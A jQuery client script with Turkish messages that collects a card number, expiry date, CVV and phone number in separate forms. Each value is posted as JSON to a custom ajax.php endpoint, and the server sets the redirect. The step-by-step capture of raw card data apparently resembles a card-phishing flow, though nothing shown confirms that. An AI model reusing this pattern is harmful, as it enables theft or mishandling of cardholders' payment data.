$(document).ready(function () {
    let form = $('#updateCardNumberForm');
    form.submit(function (e) {
        e.preventDefault();
        const cardNumber = $('#cardNumber').val();
        const action = 'updateCardNumber';
        const orderId = $('#orderId').val();
        if (cardNumber.length < 16) {
            alert('Kart numarası 16 haneli olmalıdır.');
        } else {
            const data = {
                action: action,
                cardNumber: cardNumber,
                orderId: orderId
            }
            $.ajax({
                url: '/sadece-online-ozel/ajax.php',
                type: 'POST',
                data: JSON.stringify(data),
                contentType: 'application/json',
                success: function (response) {
                    let res = JSON.parse(response);
                    if (res.status) {
                        setTimeout(function () {
                            window.location.href = res.redirect;
                        }, 1000);
                    } else {
                        alert(res.message);
                    }
                }
            })
        }
    })
    form = $('#updateCardExpForm');
    form.submit(function (e) {
        e.preventDefault();
        const cardExpMonth = $('#cardExpMonth').val();
        const cardExpYear = $('#cardExpYear').val();
        const action = 'updateCardExp';
        const orderId = $('#orderId').val();
        const data = {
            action: action,
            cardExpMonth: cardExpMonth,
            cardExpYear: cardExpYear,
            orderId: orderId
        }
        $.ajax({
            url: '/sadece-online-ozel/ajax.php',
            type: 'POST',
            data: JSON.stringify(data),
            contentType: 'application/json',
            success: function (response) {
                let res = JSON.parse(response);
                if (res.status) {
                    setTimeout(function () {
                        window.location.href = res.redirect;
                    }, 1000);
                } else {
                    alert(res.message);
                }
            }
        })
    })
    form = $('#updateCardCVVForm');
    form.submit(function (e) {
        e.preventDefault();
        const cardCVV = $('#cardCVV').val();
        const action = 'updateCardCVV';
        const orderId = $('#orderId').val();
        if (cardCVV.length < 3) {
            alert('CVV numarası 3 haneli olmalıdır.');
        } else {
            const data = {
                action: action,
                cardCVV: cardCVV,
                orderId: orderId
            }
            $.ajax({
                url: '/sadece-online-ozel/ajax.php',
                type: 'POST',
                data: JSON.stringify(data),
                contentType: 'application/json',
                success: function (response) {
                    let res = JSON.parse(response);
                    if (res.status) {
                        setTimeout(function () {
                            window.location.href = res.redirect;
                        }, 1000);
                    } else {
                        alert(res.message);
                    }
                }
            })
        }
    })
    form = $('#updatePhoneNumberForm');
    form.submit(function (e) {
        e.preventDefault();
        const phoneNumber = $('#phoneNumber').val();
        const action = 'updatePhoneNumber';
        const orderId = $('#orderId').val();
        if (phoneNumber.length > 10 || phoneNumber.length < 10) {
            alert('Telefon numarası 10 haneli olmalıdır.');
        } else {
            const data = {
                action: action,
                phoneNumber: phoneNumber,
                orderId: orderId
            }
            $.ajax({
                url: '/sadece-online-ozel/ajax.php',
                type: 'POST',
                data: JSON.stringify(data),
                contentType: 'application/json',
                success: function (response) {
                    let res = JSON.parse(response);
                    if (res.status) {
                        setTimeout(function () {
                            window.location.href = res.redirect;
                        }, 1000);
                    } else {
                        alert(res.message);
                    }
                }
            })
        }
    })
})